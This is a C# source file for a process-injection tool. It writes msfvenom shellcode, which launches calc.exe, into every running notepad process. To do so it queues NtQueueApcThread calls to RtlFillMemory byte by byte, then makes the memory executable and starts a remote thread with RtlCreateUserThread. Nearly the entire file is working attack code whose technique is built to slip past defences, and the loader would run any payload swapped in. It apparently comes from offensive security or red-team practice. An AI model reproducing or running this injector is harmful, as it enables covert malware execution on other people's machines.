using System;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace PInject
{
	
	public class Win32
	{
		
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern int NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcRoutineContext, int ApcStatusBlock, byte ApcReserved);
		[DllImport("ntdll.dll", SetLastError=true)]
		public static extern int NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		[DllImport("ntdll.dll", SetLastError=true)]
		public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);
		[DllImport("kernel32.dll")]
		public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	}

	internal class APC
	{
		internal static void WriteProcessMemoryAPC(IntPtr hProc, IntPtr pAddress, byte[] pData, int dwLength)
		{
			// Get the address of ExitThread and RtlFillMemory
			IntPtr ExitThreadAddr = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), "ExitThread");
			IntPtr RtlFillAddr = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), "RtlFillMemory");
			IntPtr hThread = IntPtr.Zero;
			
			// Create a suspended thread in a remote process ready to call ExitThread
			Win32.NtCreateThreadEx(ref hThread, 0xFFFF, IntPtr.Zero, hProc, ExitThreadAddr, IntPtr.Zero, true, 0, 0, 0, IntPtr.Zero);
			try
			{
				// Write Each byte of shellcode into the remote process
				for(int i=0; i < dwLength; i++)
				{
					IntPtr address = IntPtr.Add(pAddress, i);
					int result = Win32.NtQueueApcThread(hThread, RtlFillAddr, address, 1, pData[i]);
				}
			}
			catch(Exception)
			{
				// End of byte[] reached, resume the thread and close the handle.
				Win32.ResumeThread(hThread);
				Win32.WaitForSingleObject(hThread, 0xFFFF);
				Win32.CloseHandle(hThread);
			}
		}
	}
	
	public class Program
	{
		public static void Main()
		{
			// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
			byte[] buf = new byte[276] {
			0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
			0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
			0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
			0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
			0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
			0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
			0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
			0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
			0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
			0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
			0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
			0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
			0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
			0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
			0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
			0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
			0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
			0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
			0x63,0x2e,0x65,0x78,0x65,0x00 };
			IntPtr tHandle = IntPtr.Zero;
			uint oldProtect;
			
			// Whichever process you are planning on injecting into, change the access protections, and spawn a thread in the remote process on the RX section.
			foreach (Process p in Process.GetProcessesByName("notepad"))
			{
				IntPtr mem = Win32.VirtualAllocEx(p.Handle, IntPtr.Zero, 1000, 0x1000 | 0x2000, 0x04);
				APC.WriteProcessMemoryAPC(p.Handle, mem, buf, buf.Length + 1);
				Win32.VirtualProtectEx(p.Handle, mem, (UIntPtr)buf.Length, 0x20, out oldProtect);
				Win32.RtlCreateUserThread(p.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, mem, IntPtr.Zero, ref tHandle, IntPtr.Zero);
				Win32.CloseHandle(p.Handle);
				Win32.CloseHandle(tHandle);
			}
		}
	}
}
